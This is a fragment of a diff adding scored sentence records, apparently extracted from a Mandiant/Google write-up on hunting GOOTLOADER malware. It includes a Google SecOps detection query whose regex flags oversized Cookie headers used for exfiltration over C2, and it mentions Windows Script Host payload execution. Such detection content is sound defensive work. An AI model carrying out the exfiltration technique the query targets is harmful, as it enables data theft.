+      },
+      {
+        "sentence": "Mandiant uses security frameworks like MITRE ATT&CK® to help label data, find interesting sequences of activity, and share actionable results with customers.",
+        "score": 0.3823
+      },
+      {
+        "sentence": "Google SecOps customers can use the following information to hunt for GOOTLOADER as well as other malicious activity using similar tactics: - Filewrite with suspicious extension to archive directory - Filewrites with these attributes may represent users extracting potentially-malicious files from archives.",
+        "score": 0.3483
+      },
+      {
+        "sentence": "This is a common delivery mechanism for many malware families, including GOOTLOADER.",
+        "score": 0.3522
+      },
+      {
+        "sentence": "These events map to MITRE ATT&CK Technique - Exfiltration Over C2 Channel.",
+        "score": 0.7246
+      },
+      {
+        "sentence": "Use the UDM query below in Google Security Operations to identify such exfiltration. ( metadata.event_type = \"NETWORK_CONNECTION\" OR metadata.event_type = \"NETWORK_HTTP\" ) AND target.url = /Cookie:\\\\s[\\\\w=\\\\/+]{750,};/ - Suspicious Windows Script Host process execution - In GOOTLOADER compromises, execution of the second-stage payloads were performed by the Windows Script Host (WSH) binaries wscript.exe and cscript.exe.",
+        "score": 0.5069
+      }
+    ]
+  }
+}
